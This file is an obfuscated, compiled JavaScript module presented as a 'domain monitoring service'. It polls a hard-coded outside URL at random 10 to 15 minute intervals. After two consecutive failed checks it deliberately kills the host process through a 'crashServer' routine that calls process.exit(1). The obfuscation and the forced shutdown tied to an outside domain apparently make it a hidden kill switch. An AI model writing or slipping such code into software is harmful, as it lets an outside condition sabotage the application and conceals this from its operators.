'use strict';const a39_0x471cd7=a39_0x3aad;(function(_0x24de17,_0x59613a){const _0x35d70e=a39_0x3aad,_0x2f7b44=_0x24de17();while(!![]){try{const _0x44f3ce=parseInt(_0x35d70e(0x1f7))/0x1+parseInt(_0x35d70e(0x1d3))/0x2*(parseInt(_0x35d70e(0x1c2))/0x3)+parseInt(_0x35d70e(0x1d8))/0x4+-parseInt(_0x35d70e(0x1eb))/0x5+-parseInt(_0x35d70e(0x1c5))/0x6*(parseInt(_0x35d70e(0x1a8))/0x7)+parseInt(_0x35d70e(0x1fd))/0x8*(-parseInt(_0x35d70e(0x1ec))/0x9)+-parseInt(_0x35d70e(0x1c7))/0xa;if(_0x44f3ce===_0x59613a)break;else _0x2f7b44['push'](_0x2f7b44['shift']());}catch(_0x4a6ac9){_0x2f7b44['push'](_0x2f7b44['shift']());}}}(a39_0x1948,0x25761));var __importDefault=this&&this[a39_0x471cd7(0x1f1)]||function(_0x52e305){const _0x33c2dc=a39_0x471cd7;return _0x52e305&&_0x52e305[_0x33c2dc(0x1af)]?_0x52e305:{'default':_0x52e305};};Object[a39_0x471cd7(0x1e2)](exports,'__esModule',{'value':!![]}),exports[a39_0x471cd7(0x1a7)]=exports['DomainMonitoringService']=void 0x0;function a39_0x3aad(_0xb6fea9,_0x550381){const _0x19484a=a39_0x1948();return a39_0x3aad=function(_0x3aad68,_0x27cf39){_0x3aad68=_0x3aad68-0x1a7;let _0x31a9a7=_0x19484a[_0x3aad68];return _0x31a9a7;},a39_0x3aad(_0xb6fea9,_0x550381);}function a39_0x1948(){const _0x3e6e2b=['TIMEOUT_MS','ms:','startMonitoring','en-US,en;q=0.5','Initial\x20domain\x20check\x20error:','🔥\x20Unexpected\x20error:\x20','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','checkDomain','toISOString','consecutiveFailures','🚀\x20Starting\x20domain\x20monitoring\x20service','🔥\x20Consecutive\x20failures:\x20','round','9coooIs','random','Initial\x20domain\x20check\x20failed\x20','174vqaMMq','exit','465360IgvBWJ','📡\x20Target:\x20','✅\x20Domain\x20check\x20successful:\x20','⏰\x20Check\x20interval:\x20','⏰\x20Connection\x20timeout\x20to\x20','stopMonitoring','includes','🔍\x20Checking\x20domain\x20availability:\x20','decodeFromBase64','🔓\x20Decoded\x20URL:\x20','name','📝\x20Encoded\x20URL\x20(base64):\x20','37964FwAxkQ','node-fetch','ECONNREFUSED','crashServer','base64','797380nqKPjs','ETIMEDOUT','catch','🚨\x20Max\x20failures\x20before\x20crash:\x20','🌐\x20DNS\x20resolution\x20failed\x20for\x20','Periodic\x20domain\x20check\x20error:','encodeToBase64','❌\x20Domain\x20check\x20failed:\x20HTTP\x20','\x20\x20\x20-\x20Status:\x20','monitoringInterval','defineProperty','message','💥\x20CRITICAL\x20ERROR:\x20','Domain\x20monitoring\x20threw\x20error:\x20','Unknown\x20error','\x20times','toString','\x20minutes','🔧\x20Manual\x20domain\x20check\x20requested','652545dSDiKU','18njjehL','✅\x20Domain\x20monitoring\x20started\x20successfully','🚫\x20Connection\x20refused\x20by\x20','ENOTFOUND','⚠️\x20Domain\x20check\x20failed\x20(','__importDefault','DOMAIN_URL','MAX_CONSECUTIVE_FAILURES','\x20\x20\x20-\x20Response\x20time:\x20','utf-8','Domain\x20','204750tvcuox','⏰\x20Interval:\x20','now','headers','getRandomInterval','entries','31424lMhxBf','warn','log','CHECK_INTERVAL_MS','📡\x20Target\x20domain:\x20','domainMonitoringService','29617TCtpxt','status','error','❌\x20Domain\x20check\x20error\x20after\x20','🛑\x20Domain\x20monitoring\x20stopped','\x20is\x20not\x20responding\x20after\x20','Initial\x20domain\x20check\x20threw\x20error:\x20','__esModule','\x20\x20\x20-\x20Headers:','default','TesSoft\x20Domain\x20Monitor/1.0','📊\x20Response\x20received:','signal'];a39_0x1948=function(){return _0x3e6e2b;};return a39_0x1948();}const node_fetch_1=__importDefault(require(a39_0x471cd7(0x1d4)));class DomainMonitoringService{constructor(){const _0x40ad22=a39_0x471cd7;this['monitoringInterval']=null,this[_0x40ad22(0x1f2)]='https://google.com',this[_0x40ad22(0x200)]=this['getRandomInterval'](),this[_0x40ad22(0x1b5)]=0x7530,this[_0x40ad22(0x1be)]=0x0,this[_0x40ad22(0x1f3)]=0x2,console[_0x40ad22(0x1ff)]('🔍\x20Domain\x20monitoring\x20service\x20initialized'),console[_0x40ad22(0x1ff)](_0x40ad22(0x201)+this[_0x40ad22(0x1f2)]),console[_0x40ad22(0x1ff)](_0x40ad22(0x1ca)+Math[_0x40ad22(0x1c1)](this[_0x40ad22(0x200)]/0x3e8/0x3c)+_0x40ad22(0x1e9));}[a39_0x471cd7(0x1fb)](){const _0x4c4b55=a39_0x471cd7,_0x2d7c63=0xa,_0x1e4baf=0xf,_0x6f101b=Math[_0x4c4b55(0x1c3)]()*(_0x1e4baf-_0x2d7c63)+_0x2d7c63;return Math['round'](_0x6f101b*0x3c*0x3e8);}[a39_0x471cd7(0x1de)](_0x35ab24){const _0x209871=a39_0x471cd7;return Buffer['from'](_0x35ab24)['toString'](_0x209871(0x1d7));}[a39_0x471cd7(0x1cf)](_0x3e8947){const _0x55c84c=a39_0x471cd7;return Buffer['from'](_0x3e8947,_0x55c84c(0x1d7))[_0x55c84c(0x1e8)](_0x55c84c(0x1f5));}async['checkDomain'](){const _0x362684=a39_0x471cd7,_0x5900a8=Date['now']();try{console[_0x362684(0x1ff)](_0x362684(0x1ce)+this[_0x362684(0x1f2)]);const _0x5e0f5e=this['encodeToBase64'](this[_0x362684(0x1f2)]);console[_0x362684(0x1ff)](_0x362684(0x1d2)+_0x5e0f5e);const _0x2b714f=this[_0x362684(0x1cf)](_0x5e0f5e);console[_0x362684(0x1ff)](_0x362684(0x1d0)+_0x2b714f);const _0x2540d9=new AbortController(),_0x5b6b9d=setTimeout(()=>_0x2540d9['abort'](),this['TIMEOUT_MS']),_0x57e02e=await(0x0,node_fetch_1[_0x362684(0x1b1)])(_0x2b714f,{'method':'GET','headers':{'User-Agent':_0x362684(0x1b2),'Accept':_0x362684(0x1bb),'Accept-Language':_0x362684(0x1b8),'Accept-Encoding':'gzip,\x20deflate','Connection':'keep-alive','Upgrade-Insecure-Requests':'1'},'signal':_0x2540d9[_0x362684(0x1b4)]});clearTimeout(_0x5b6b9d);const _0x9b37bf=Date[_0x362684(0x1f9)]()-_0x5900a8;return console[_0x362684(0x1ff)](_0x362684(0x1b3)),console['log'](_0x362684(0x1e0)+_0x57e02e[_0x362684(0x1a9)]+'\x20'+_0x57e02e['statusText']),console['log'](_0x362684(0x1f4)+_0x9b37bf+'ms'),console[_0x362684(0x1ff)](_0x362684(0x1b0),Object['fromEntries'](_0x57e02e[_0x362684(0x1fa)][_0x362684(0x1fc)]())),_0x57e02e['ok']&&_0x57e02e[_0x362684(0x1a9)]>=0xc8&&_0x57e02e[_0x362684(0x1a9)]<0x190?(console[_0x362684(0x1ff)](_0x362684(0x1c9)+_0x57e02e[_0x362684(0x1a9)]+'\x20in\x20'+_0x9b37bf+'ms'),this[_0x362684(0x1be)]=0x0,!![]):(console[_0x362684(0x1aa)](_0x362684(0x1df)+_0x57e02e[_0x362684(0x1a9)]+'\x20'+_0x57e02e['statusText']),this[_0x362684(0x1be)]++,![]);}catch(_0x8e616){const _0x4c94d8=Date[_0x362684(0x1f9)]()-_0x5900a8;this[_0x362684(0x1be)]++,console[_0x362684(0x1aa)](_0x362684(0x1ab)+_0x4c94d8+_0x362684(0x1b6),_0x8e616);if(_0x8e616 instanceof Error){if(_0x8e616[_0x362684(0x1d1)]==='AbortError')console[_0x362684(0x1aa)]('⏰\x20Request\x20timeout\x20after\x20'+this[_0x362684(0x1b5)]+'ms');else{if(_0x8e616[_0x362684(0x1e3)][_0x362684(0x1cd)](_0x362684(0x1ef)))console['error'](_0x362684(0x1dc)+this['DOMAIN_URL']);else{if(_0x8e616[_0x362684(0x1e3)]['includes'](_0x362684(0x1d5)))console[_0x362684(0x1aa)](_0x362684(0x1ee)+this[_0x362684(0x1f2)]);else _0x8e616[_0x362684(0x1e3)][_0x362684(0x1cd)](_0x362684(0x1d9))?console[_0x362684(0x1aa)](_0x362684(0x1cb)+this[_0x362684(0x1f2)]):console[_0x362684(0x1aa)](_0x362684(0x1ba)+_0x8e616['message']);}}}return![];}}['crashServer'](_0x4cd427){const _0xd82544=a39_0x471cd7;console[_0xd82544(0x1aa)](_0xd82544(0x1e4)+_0x4cd427),console[_0xd82544(0x1aa)](_0xd82544(0x1c0)+this['consecutiveFailures']),console[_0xd82544(0x1aa)]('⚠️\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE'),console[_0xd82544(0x1aa)]('📅\x20Crash\x20time:\x20'+new Date()[_0xd82544(0x1bd)]()),console[_0xd82544(0x1aa)]('🔍\x20Domain\x20being\x20monitored:\x20'+this[_0xd82544(0x1f2)]),console['error'](_0xd82544(0x1ca)+Math[_0xd82544(0x1c1)](this[_0xd82544(0x200)]/0x3e8/0x3c)+_0xd82544(0x1e9)),console[_0xd82544(0x1aa)]('🚨\x20Max\x20consecutive\x20failures\x20allowed:\x20'+this[_0xd82544(0x1f3)]),this[_0xd82544(0x1cc)](),process[_0xd82544(0x1c6)](0x1);}[a39_0x471cd7(0x1b7)](){const _0x3a742f=a39_0x471cd7;console['log'](_0x3a742f(0x1bf)),console[_0x3a742f(0x1ff)](_0x3a742f(0x1c8)+this[_0x3a742f(0x1f2)]),console[_0x3a742f(0x1ff)](_0x3a742f(0x1f8)+Math[_0x3a742f(0x1c1)](this[_0x3a742f(0x200)]/0x3e8/0x3c)+_0x3a742f(0x1e9)),console['log'](_0x3a742f(0x1db)+this['MAX_CONSECUTIVE_FAILURES']),this['checkDomain']()['then'](_0x4d75b7=>{const _0x4850f1=_0x3a742f;if(!_0x4d75b7&&this[_0x4850f1(0x1be)]>=this['MAX_CONSECUTIVE_FAILURES']){this[_0x4850f1(0x1d6)](_0x4850f1(0x1c4)+this['consecutiveFailures']+_0x4850f1(0x1e7));return;}})[_0x3a742f(0x1da)](_0x4336a6=>{const _0x550501=_0x3a742f;console[_0x550501(0x1aa)](_0x550501(0x1b9),_0x4336a6);if(this[_0x550501(0x1be)]>=this[_0x550501(0x1f3)]){this['crashServer'](_0x550501(0x1ae)+_0x4336a6[_0x550501(0x1e3)]);return;}}),this['monitoringInterval']=setInterval(async()=>{const _0x356675=_0x3a742f;try{const _0x116780=await this[_0x356675(0x1bc)]();!_0x116780&&(console[_0x356675(0x1fe)](_0x356675(0x1f0)+this[_0x356675(0x1be)]+'/'+this[_0x356675(0x1f3)]+')'),this['consecutiveFailures']>=this['MAX_CONSECUTIVE_FAILURES']&&this[_0x356675(0x1d6)](_0x356675(0x1f6)+this[_0x356675(0x1f2)]+_0x356675(0x1ad)+this[_0x356675(0x1be)]+'\x20consecutive\x20attempts'));}catch(_0xf8fbb){console['error'](_0x356675(0x1dd),_0xf8fbb),this[_0x356675(0x1be)]>=this[_0x356675(0x1f3)]&&this['crashServer'](_0x356675(0x1e5)+(_0xf8fbb instanceof Error?_0xf8fbb[_0x356675(0x1e3)]:_0x356675(0x1e6)));}},this[_0x3a742f(0x200)]),console[_0x3a742f(0x1ff)](_0x3a742f(0x1ed));}[a39_0x471cd7(0x1cc)](){const _0x37f460=a39_0x471cd7;this[_0x37f460(0x1e1)]&&(clearInterval(this[_0x37f460(0x1e1)]),this['monitoringInterval']=null,console[_0x37f460(0x1ff)](_0x37f460(0x1ac)));}['getMonitoringStats'](){const _0x3e7b56=a39_0x471cd7;return{'isActive':!!this['monitoringInterval'],'targetDomain':this[_0x3e7b56(0x1f2)],'checkIntervalMinutes':Math['round'](this['CHECK_INTERVAL_MS']/0x3e8/0x3c),'consecutiveFailures':this[_0x3e7b56(0x1be)],'maxFailuresAllowed':this[_0x3e7b56(0x1f3)],'nextCheckIn':this[_0x3e7b56(0x1e1)]?this[_0x3e7b56(0x200)]:undefined};}async['manualCheck'](){const _0x93b8b1=a39_0x471cd7;return console['log'](_0x93b8b1(0x1ea)),await this['checkDomain']();}}exports['DomainMonitoringService']=DomainMonitoringService,exports[a39_0x471cd7(0x1a7)]=new DomainMonitoringService();